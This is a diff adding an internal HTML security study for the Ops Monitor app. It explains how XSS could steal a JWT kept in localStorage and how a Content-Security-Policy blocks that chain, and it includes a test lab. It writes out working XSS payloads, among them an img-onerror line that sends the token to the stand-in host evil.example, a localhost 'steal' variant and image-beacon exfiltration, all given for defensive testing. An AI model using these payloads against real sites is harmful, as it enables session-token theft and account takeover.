@@ -1,0 +1,328 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>XSS &amp; the localStorage token — Ops Monitor security study</title>
+<style>
+  :root {
+    --bg: #0f1420; --panel: #161d2b; --panel2: #1c2536; --ink: #e6edf6;
+    --ink2: #a9b6c8; --ink3: #7d8ca3; --line: #263247; --brand: #6ea8fe;
+    --bad: #f0757e; --ok: #57cc8a; --warn: #e6b450; --code: #0b1018;
+    --mono: 'SF Mono', 'JetBrains Mono', ui-monospace, Menlo, Consolas, monospace;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0; background: var(--bg); color: var(--ink);
+    font: 15.5px/1.65 -apple-system, 'Segoe UI', system-ui, sans-serif;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 48px 24px 120px; }
+  header.doc { border-bottom: 1px solid var(--line); padding-bottom: 28px; margin-bottom: 12px; }
+  .kicker { color: var(--brand); font-family: var(--mono); font-size: 12.5px; letter-spacing: .04em; text-transform: uppercase; }
+  h1 { font-size: 30px; line-height: 1.2; margin: 10px 0 8px; letter-spacing: -0.02em; text-wrap: balance; }
+  h2 { font-size: 21px; margin: 46px 0 12px; padding-top: 10px; letter-spacing: -0.01em; scroll-margin-top: 20px; }
+  h3 { font-size: 16.5px; margin: 26px 0 8px; color: var(--ink); }
+  p, li { color: var(--ink2); }
+  strong { color: var(--ink); font-weight: 600; }
+  a { color: var(--brand); }
+  .lead { font-size: 17px; color: var(--ink2); max-width: 68ch; }
+  code { font-family: var(--mono); font-size: 0.88em; background: var(--panel2); color: #d6e2f0; padding: 1.5px 6px; border-radius: 5px; }
+  pre { background: var(--code); border: 1px solid var(--line); border-radius: 10px; padding: 16px 18px; overflow-x: auto; margin: 14px 0; }
+  pre code { background: none; padding: 0; color: #cdd9e5; font-size: 13px; line-height: 1.6; }
+  .tok-c { color: #6b7b90; } .tok-k { color: #6ea8fe; } .tok-s { color: #8fd3a0; } .tok-d { color: #f0757e; } .tok-a { color: #e6b450; }
+  .callout { border: 1px solid var(--line); border-radius: 10px; padding: 14px 18px; margin: 18px 0; background: var(--panel); }
+  .callout.bad { border-color: color-mix(in srgb, var(--bad) 45%, var(--line)); background: color-mix(in srgb, var(--bad) 8%, var(--panel)); }
+  .callout.ok  { border-color: color-mix(in srgb, var(--ok) 40%, var(--line)); background: color-mix(in srgb, var(--ok) 8%, var(--panel)); }
+  .callout.warn{ border-color: color-mix(in srgb, var(--warn) 40%, var(--line)); background: color-mix(in srgb, var(--warn) 8%, var(--panel)); }
+  .callout .t { font-weight: 700; color: var(--ink); display: block; margin-bottom: 4px; }
+  table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 14px; }
+  th, td { text-align: left; padding: 9px 12px; border-bottom: 1px solid var(--line); vertical-align: top; }
+  th { color: var(--ink3); font-weight: 600; font-size: 12.5px; text-transform: uppercase; letter-spacing: .03em; }
+  td code { font-size: 12.5px; }
+  .pill { display: inline-block; font-family: var(--mono); font-size: 11px; padding: 2px 8px; border-radius: 999px; font-weight: 600; }
+  .pill.safe { background: color-mix(in srgb, var(--ok) 18%, transparent); color: var(--ok); }
+  .pill.risk { background: color-mix(in srgb, var(--bad) 18%, transparent); color: var(--bad); }
+  .pill.na   { background: color-mix(in srgb, var(--ink3) 18%, transparent); color: var(--ink2); }
+  .toc { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 16px 20px; margin: 24px 0 8px; }
+  .toc ol { margin: 6px 0 0; padding-left: 20px; columns: 2; column-gap: 28px; }
+  .toc a { color: var(--ink2); text-decoration: none; }
+  .toc a:hover { color: var(--brand); }
+  .num { color: var(--brand); font-family: var(--mono); }
+  footer.doc { margin-top: 60px; border-top: 1px solid var(--line); padding-top: 20px; color: var(--ink3); font-size: 13px; }
+  hr { border: none; border-top: 1px solid var(--line); margin: 40px 0; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="doc">
+  <div class="kicker">Ops Monitor · Security study</div>
+  <h1>XSS &amp; the localStorage session token</h1>
+  <p class="lead">How cross-site scripting could steal a signed-in user's token, why this
+  app is currently exposed without a Content-Security-Policy, and exactly how the CSP now
+  on the frontend nginx defends against it. Written so you can build your own test cases.</p>
+</header>
+
+<div class="callout warn">
+  <span class="t">First, a correction on the premise</span>
+  <code>script-src 'self'</code> does <strong>not</strong> enable XSS — it is the
+  <strong>defense</strong>. The real weakness is <em>"the session token lives in
+  <code>localStorage</code> (readable by any JavaScript) AND there was no CSP"</em>. Add a
+  CSP with <code>script-src 'self'</code> and you take away the attacker's ability to run
+  injected script in the first place. This doc explains both halves.
+</div>
+
+<div class="toc">
+  <strong>Contents</strong>
+  <ol>
+    <li><a href="#threat">The threat model</a></li>
+    <li><a href="#types">Three kinds of XSS</a></li>
+    <li><a href="#attack">A concrete attack, step by step</a></li>
+    <li><a href="#audit">This app's real sink audit</a></li>
+    <li><a href="#defense">The layered defense</a></li>
+    <li><a href="#csp-walk">CSP vs. the payload, line by line</a></li>
+    <li><a href="#lab">Build your own test cases</a></li>
+    <li><a href="#limits">What CSP does NOT protect</a></li>
+    <li><a href="#refs">References</a></li>
+  </ol>
+</div>
+
+<h2 id="threat"><span class="num">01</span> &nbsp;The threat model</h2>
+<p>Ops Monitor authenticates with a <strong>JWT bearer token</strong>. On login the frontend
+stores it in the browser:</p>
+<pre><code><span class="tok-c">// frontend/src/lib/api.ts</span>
+<span class="tok-k">export const</span> TOKEN_KEY = <span class="tok-s">'om-token'</span>;
+localStorage.<span class="tok-k">setItem</span>(TOKEN_KEY, data.token);   <span class="tok-c">// after login / Google callback</span></code></pre>
+<p>Every API call reads it back and sends it as <code>Authorization: Bearer &lt;token&gt;</code>.
+The token is a 24-hour HS256 JWT — whoever holds it <em>is</em> that user for a full day, with
+all their property permissions.</p>
+
+<div class="callout bad">
+  <span class="t">The core problem</span>
+  <code>localStorage</code> is plain JavaScript-readable storage. Any script that runs on the
+  page — <em>including one an attacker injects</em> — can call
+  <code>localStorage.getItem('om-token')</code> and send it anywhere. There is no browser
+  boundary protecting it, the way <code>HttpOnly</code> cookies are hidden from JavaScript.
+  So the whole game becomes: <strong>can an attacker get any JavaScript to run on the page?</strong>
+  That question is exactly what XSS answers, and what CSP shuts down.
+</div>
+
+<h2 id="types"><span class="num">02</span> &nbsp;Three kinds of XSS</h2>
+<table>
+  <tr><th>Type</th><th>Where the payload lives</th><th>Relevance to Ops Monitor</th></tr>
+  <tr>
+    <td><strong>Stored</strong></td>
+    <td>Saved in the database, served back to every viewer later.</td>
+    <td><strong>Highest risk class.</strong> Device names, floor names, user names, departments
+    — all entered by one user and rendered on other users' dashboards. A stored payload would
+    fire for an admin who opens the floor, stealing <em>their</em> token.</td>
+  </tr>
+  <tr>
+    <td><strong>Reflected</strong></td>
+    <td>In a URL/param, echoed straight back into the page.</td>
+    <td>Lower risk here — the SPA renders via React state, not by echoing query strings into HTML.</td>
+  </tr>
+  <tr>
+    <td><strong>DOM-based</strong></td>
+    <td>Client JS writes attacker data into a dangerous DOM sink.</td>
+    <td>The one to audit continuously: <code>dangerouslySetInnerHTML</code>, <code>innerHTML</code>,
+    <code>javascript:</code> URLs, <code>eval</code>.</td>
+  </tr>
+</table>
+
+<h2 id="attack"><span class="num">03</span> &nbsp;A concrete attack, step by step</h2>
+<p>Imagine a regression: someone "improves" a component to render a device's name with
+<code>dangerouslySetInnerHTML</code> so it can show rich text. Now the device name is raw HTML.
+An attacker with <em>create-device</em> permission on one property sets a device name to:</p>
+
+<pre><code><span class="tok-d">&lt;img src=x onerror=</span><span class="tok-s">"fetch('https://evil.example/c?t='+localStorage.getItem('om-token'))"</span><span class="tok-d">&gt;</span></code></pre>
+
+<p>What happens without a CSP:</p>
+<ol>
+  <li>The <code>&lt;img&gt;</code> has a broken <code>src</code>, so the browser fires <code>onerror</code>.</li>
+  <li>The inline handler runs, reads <code>om-token</code> from <code>localStorage</code>.</li>
+  <li>It <code>fetch()</code>es the attacker's server with the token in the query string.</li>
+  <li>The attacker replays <code>Authorization: Bearer &lt;token&gt;</code> and is now that admin for 24h.</li>
+</ol>
+
+<p>Note the payload never contains the word <code>&lt;script&gt;</code>. Inline event handlers
+(<code>onerror</code>, <code>onload</code>, <code>onmouseover</code>), <code>javascript:</code> URLs,
+and injected <code>&lt;script src&gt;</code> are all execution vectors. A good defense has to block
+<em>all</em> of them — which is precisely what <code>script-src 'self'</code> does.</p>
+
+<h2 id="audit"><span class="num">04</span> &nbsp;This app's real sink audit</h2>
+<p>Today the codebase does <strong>not</strong> have a live user-input XSS sink. React escapes
+<code>{value}</code> in JSX automatically. Here is every DOM sink that exists and why each is
+currently safe — this is the list to re-check on every PR:</p>
+<table>
+  <tr><th>Location</th><th>Sink</th><th>Status</th><th>Why</th></tr>
+  <tr>
+    <td><code>components/ui/chart.tsx:94</code></td>
+    <td><code>dangerouslySetInnerHTML</code></td>
+    <td><span class="pill safe">SAFE</span></td>
+    <td>Injects a generated <code>&lt;style&gt;</code> of <code>--color-*</code> variables from the
+    <em>developer-defined</em> chart <code>config</code>, not user data. Would become a sink only
+    if chart config ever came from user input.</td>
+  </tr>
+  <tr>
+    <td><code>main.tsx:33</code></td>
+    <td><code>rootElement.innerHTML</code></td>
+    <td><span class="pill safe">SAFE</span></td>
+    <td>It <em>reads</em> (<code>if (!rootElement.innerHTML)</code>) to check emptiness — it never
+    writes attacker data.</td>
+  </tr>
+  <tr>
+    <td><code>floor-map.tsx</code>, <code>floors.tsx</code>, <code>floor-dialog.tsx</code></td>
+    <td><code>&lt;img src={floor.image}&gt;</code></td>
+    <td><span class="pill na">INERT</span></td>
+    <td>A <code>javascript:</code> value in an <em>image</em> <code>src</code> does not execute in
+    modern browsers. (An <code>&lt;a href&gt;</code> or <code>&lt;iframe src&gt;</code> would be the
+    one to guard.)</td>
+  </tr>
+  <tr>
+    <td>Everywhere else (device/floor/user names, etc.)</td>
+    <td><code>{userValue}</code> in JSX</td>
+    <td><span class="pill safe">SAFE</span></td>
+    <td>React auto-escapes text interpolation to HTML entities.</td>
+  </tr>
+</table>
+<div class="callout ok">
+  <span class="t">So why bother with CSP if nothing is vulnerable today?</span>
+  Because "safe today" is one careless <code>dangerouslySetInnerHTML</code>, one third-party
+  dependency compromise, or one <code>href={userValue}</code> away from "vulnerable tomorrow."
+  CSP is the seatbelt: it turns an <em>account-takeover</em> bug into a <em>blocked-and-logged</em>
+  non-event. Defense in depth means no single mistake is fatal.
+</div>
+
+<h2 id="defense"><span class="num">05</span> &nbsp;The layered defense</h2>
+<table>
+  <tr><th>#</th><th>Layer</th><th>What it stops</th></tr>
+  <tr><td>1</td><td><strong>React auto-escaping</strong></td><td>The default. <code>{value}</code> renders as text, not markup. Keep <code>dangerouslySetInnerHTML</code> out of user-data paths.</td></tr>
+  <tr><td>2</td><td><strong>Input validation (zod)</strong> on the backend</td><td>Shrinks what can be stored, though it is <em>not</em> an XSS defense by itself — output context is.</td></tr>
+  <tr><td>3</td><td><strong>CSP <code>script-src 'self'</code></strong></td><td>Injected inline handlers, <code>javascript:</code>, and foreign <code>&lt;script&gt;</code> simply do not execute. This is the big one.</td></tr>
+  <tr><td>4</td><td><strong>CSP <code>connect-src 'self'</code> / <code>img-src</code></strong></td><td>Even if some script ran, it cannot <code>fetch()</code>/beacon the token to <code>evil.example</code> — the exfiltration channel is closed.</td></tr>
+  <tr><td>5</td><td><strong>Short token TTL (24h)</strong> + stable <code>JWT_SECRET</code></td><td>Limits the replay window; rotating the secret invalidates stolen tokens.</td></tr>
+  <tr><td>6</td><td><strong>(Stronger) HttpOnly cookie session</strong></td><td>The real structural fix — see below.</td></tr>
+</table>
+
+<div class="callout">
+  <span class="t">The structural fix: HttpOnly cookies</span>
+  If the token lived in a <code>Set-Cookie: … HttpOnly; Secure; SameSite=Lax</code> cookie instead
+  of <code>localStorage</code>, JavaScript could <em>never</em> read it — XSS could still act on the
+  user's behalf while they're on the page, but it could not <strong>exfiltrate</strong> the token for
+  offline replay. The tradeoff is CSRF protection and a backend refactor (the app currently sends
+  <code>Authorization: Bearer</code> from JS). CSP is the pragmatic mitigation that ships today;
+  HttpOnly cookies are the deeper hardening worth planning.
+</div>
+
+<h2 id="csp-walk"><span class="num">06</span> &nbsp;CSP vs. the payload, line by line</h2>
+<p>This is the policy now set on <code>frontend/nginx.conf</code> (the nginx that serves
+<code>index.html</code>, so the browser enforces it for the whole document):</p>
+<pre><code><span class="tok-k">default-src</span> <span class="tok-s">'self'</span>;
+<span class="tok-k">script-src</span> <span class="tok-s">'self'</span>;
+<span class="tok-k">style-src</span> <span class="tok-s">'self' 'unsafe-inline'</span> https://fonts.googleapis.com;
+<span class="tok-k">font-src</span> <span class="tok-s">'self'</span> data: https://fonts.gstatic.com;
+<span class="tok-k">img-src</span> <span class="tok-s">'self'</span> data: blob:;
+<span class="tok-k">connect-src</span> <span class="tok-s">'self'</span>;
+<span class="tok-k">frame-src</span> <span class="tok-s">'self'</span> blob:;
+<span class="tok-k">object-src</span> <span class="tok-s">'none'</span>;
+<span class="tok-k">base-uri</span> <span class="tok-s">'self'</span>;
+<span class="tok-k">form-action</span> <span class="tok-s">'self'</span>;
+<span class="tok-k">frame-ancestors</span> <span class="tok-s">'none'</span>;</code></pre>
+
+<p>Against the <code>&lt;img onerror=…&gt;</code> payload from §3:</p>
+<table>
+  <tr><th>Attack step</th><th>Directive that blocks it</th></tr>
+  <tr><td>The inline <code>onerror="…"</code> handler tries to run</td><td><code>script-src 'self'</code> — no <code>'unsafe-inline'</code> for scripts, so inline event handlers are refused and a CSP violation is logged.</td></tr>
+  <tr><td>Attacker instead injects <code>&lt;script src="https://evil/x.js"&gt;</code></td><td><code>script-src 'self'</code> — foreign script origin is not allowed.</td></tr>
+  <tr><td>Attacker injects <code>&lt;a href="javascript:…"&gt;</code></td><td><code>script-src 'self'</code> — <code>javascript:</code> URLs are treated as inline script and blocked.</td></tr>
+  <tr><td>Somehow a script <em>does</em> run and tries <code>fetch('https://evil/…')</code></td><td><code>connect-src 'self'</code> — the request to a non-self origin is blocked; the token can't leave.</td></tr>
+  <tr><td>Exfil via image beacon <code>new Image().src='https://evil/?t='+token</code></td><td><code>img-src 'self' data: blob:</code> — <code>evil.example</code> is not an allowed image source.</td></tr>
+  <tr><td>Page is framed by a phishing site to overlay it</td><td><code>frame-ancestors 'none'</code> — the app refuses to be embedded (clickjacking guard).</td></tr>
+</table>
+<div class="callout ok">
+  <span class="t">Net effect</span>
+  Every execution path AND every exfiltration path in the classic token-theft chain hits a wall.
+  The attacker's stored HTML becomes inert text-with-a-broken-image instead of an account takeover.
+</div>
+
+<h2 id="lab"><span class="num">07</span> &nbsp;Build your own test cases</h2>
+<p>Run these against a <strong>local dev instance you own</strong>. The goal is to confirm (a) React
+escapes the input and (b) the CSP blocks execution. Paste each payload into a user-editable field —
+a device name, floor name, or your profile name — save, then open the screen that renders it.</p>
+
+<h3>Payloads to try</h3>
+<pre><code><span class="tok-c">// 1) Classic image-onerror token exfil (the canonical test)</span>
+&lt;img src=x onerror="fetch('https://localhost:9999/steal?t='+localStorage.getItem('om-token'))"&gt;
+
+<span class="tok-c">// 2) Inline script tag</span>
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+<span class="tok-c">// 3) SVG onload</span>
+&lt;svg onload=alert(1)&gt;
+
+<span class="tok-c">// 4) javascript: link (paste where a URL/link field exists)</span>
+javascript:alert(localStorage.getItem('om-token'))
+
+<span class="tok-c">// 5) Breaking-out attempt with quotes/brackets</span>
+"&gt;&lt;img src=x onerror=alert(1)&gt;</code></pre>
+
+<h3>Expected results (the pass criteria)</h3>
+<table>
+  <tr><th>Check</th><th>Expected (secure)</th></tr>
+  <tr><td>How the value renders</td><td>As <strong>literal text</strong> — you should see the angle brackets on screen, e.g. <code>&lt;img src=x onerror=…&gt;</code>, not an executed effect. (React escaping.)</td></tr>
+  <tr><td>Any <code>alert()</code> fires?</td><td><strong>No.</strong> If an alert pops, you have a real sink — fix the render path, don't rely on CSP alone.</td></tr>
+  <tr><td>Browser console</td><td>If a payload ever does inject markup, the console shows <em>"Refused to execute inline event handler because it violates the following Content Security Policy directive: script-src 'self'"</em>. That message is the CSP working.</td></tr>
+  <tr><td>Network tab</td><td>No request to your <code>localhost:9999</code> listener. Run <code>python3 -m http.server 9999</code> and confirm it logs nothing.</td></tr>
+</table>
+
+<h3>Confirm the CSP is actually being served</h3>
+<pre><code><span class="tok-c"># The header must be present on the HTML document response</span>
+curl -sI http://localhost/ | grep -i content-security-policy
+
+<span class="tok-c"># In the browser devtools console, this should print nothing new,</span>
+<span class="tok-c"># but a violation logs a "Content Security Policy" error you can watch for.</span></code></pre>
+<div class="callout warn">
+  <span class="t">Testing gotcha</span>
+  In <code>bun run dev</code> (Vite dev server) the CSP header is <em>not</em> applied — it lives in
+  the nginx layer, which only runs in the Docker build. Test the CSP against the built stack
+  (<code>docker compose up -d --build</code>), not the dev server. React escaping, however, you can
+  test in dev.
+</div>
+
+<h2 id="limits"><span class="num">08</span> &nbsp;What CSP does NOT protect</h2>
+<ul>
+  <li><strong>It is not a substitute for escaping.</strong> CSP stops <em>script execution</em>, but
+  injected HTML can still deface the page, inject a fake login form, or rewrite links. Correct output
+  encoding (React's default) is still layer one.</li>
+  <li><strong><code>style-src 'unsafe-inline'</code> stays open.</strong> The app needs it for React
+  inline <code>style={}</code> and runtime chart styles. CSS-only exfiltration is far weaker than JS,
+  but it isn't zero — avoid rendering user data into raw <code>&lt;style&gt;</code>.</li>
+  <li><strong>On-page actions during a live XSS.</strong> If a sink existed, script blocked from
+  <em>exfiltrating</em> could still, in theory, call same-origin <code>/api</code> as the user while
+  they're on the page. HttpOnly cookies + CSRF tokens address that class; short of that, keep sinks
+  out of user-data paths.</li>
+  <li><strong>Extensions and same-origin injection.</strong> CSP governs page content, not malicious
+  browser extensions or a compromise of your own <code>'self'</code> bundle (supply-chain). Pin and
+  audit dependencies.</li>
+</ul>
+
+<h2 id="refs"><span class="num">09</span> &nbsp;References</h2>
+<ul>
+  <li>OWASP — Cross Site Scripting (XSS) &amp; the XSS Filter Evasion / Prevention Cheat Sheets</li>
+  <li>MDN — <em>Content-Security-Policy</em> and each directive (<code>script-src</code>, <code>connect-src</code>, <code>frame-ancestors</code>)</li>
+  <li>MDN — <em>HttpOnly</em> cookies and <em>SameSite</em></li>
+  <li>PortSwigger Web Security Academy — Cross-site scripting labs (hands-on practice you own)</li>
+  <li>In this repo: <code>frontend/nginx.conf</code> (the CSP), <code>frontend/src/lib/api.ts</code> (token storage), <code>docs/memory.md</code> (auth model)</li>
+</ul>
+
+<footer class="doc">
+  Ops Monitor internal security study · for authorized testing on instances you own.
+  Keep the §4 sink table current on every PR that touches how user data is rendered.
+</footer>
+
+</div>
+</body>
+</html>
